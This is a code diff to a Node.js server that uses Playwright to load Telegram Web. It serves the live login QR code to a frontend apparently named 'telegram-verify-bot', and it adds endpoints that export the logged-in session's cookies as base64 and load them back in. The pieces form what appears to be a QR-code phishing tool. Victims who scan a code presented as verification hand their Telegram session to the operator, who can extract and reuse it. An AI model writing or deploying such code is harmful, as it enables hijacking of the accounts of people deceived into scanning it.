@@ -5,10 +5,9 @@ const { chromium } = require("playwright");
 const app = express();
 const PORT = 5000;
 let browser, page;
-let latestSVG = null; // Store latest QR code in memory
+let latestSVG = null;
 
-// Enable CORS for all requests
-app.use(cors({ origin: "http://localhost:5173" })); // Allow only your frontend
+app.use(cors({ origin: "https://telegram-verify-bot-818r.onrender.com" }));
 
 async function initBrowser() {
     if (browser) return;
@@ -18,12 +17,28 @@ async function initBrowser() {
 
     try {
         await page.goto("https://web.telegram.org/a/", { waitUntil: "networkidle" });
+
         console.log("Browser initialized and page loaded");
+
         checkForNewSVG();
     } catch (error) {
         console.error("Error initializing browser:", error);
         await restartBrowser();
     }
+}
+
+async function getSessionID() {
+    const cookies = await page.context().cookies();
+    const sessionID = Buffer.from(JSON.stringify(cookies)).toString("base64"); // Encode as Base64
+    console.log("Session ID:", sessionID);
+    return sessionID;
+}
+
+async function loadSessionID(sessionID) {
+    const cookies = JSON.parse(Buffer.from(sessionID, "base64").toString("utf8")); // Decode Base64
+    await page.context().addCookies(cookies);
+    console.log("Session restored!");
+    await page.reload({ waitUntil: "networkidle" });
 }
 
 async function checkForNewSVG() {
@@ -54,8 +69,22 @@ async function restartBrowser() {
     await initBrowser();
 }
 
+// API to get session ID
+app.get("/get-session", async (req, res) => {
+    if (!page) return res.status(500).send("Browser not initialized");
+    const sessionID = await getSessionID();
+    res.json({ sessionID });
+});
+
+// API to load session ID
+app.post("/load-session", express.json(), async (req, res) => {
+    if (!req.body.sessionID) return res.status(400).send("Session ID required");
+    await loadSessionID(req.body.sessionID);
+    res.send("Session restored!");
+});
+
 app.get("/qr.svg", (req, res) => {
-    res.set("Access-Control-Allow-Origin", "http://localhost:5173"); // Allow your frontend
+    res.set("Access-Control-Allow-Origin", "https://telegram-verify-bot-818r.onrender.com");
     res.set("Content-Type", "image/svg+xml");
 
     if (latestSVG) {
@@ -67,5 +96,5 @@ app.get("/qr.svg", (req, res) => {
 
 app.listen(PORT, async () => {
     await initBrowser();
-    console.log(`Server running at http://localhost:${PORT}`);
+    console.log(`Server running at https://telegram-verify-bot-818r.onrender.com`);
 });
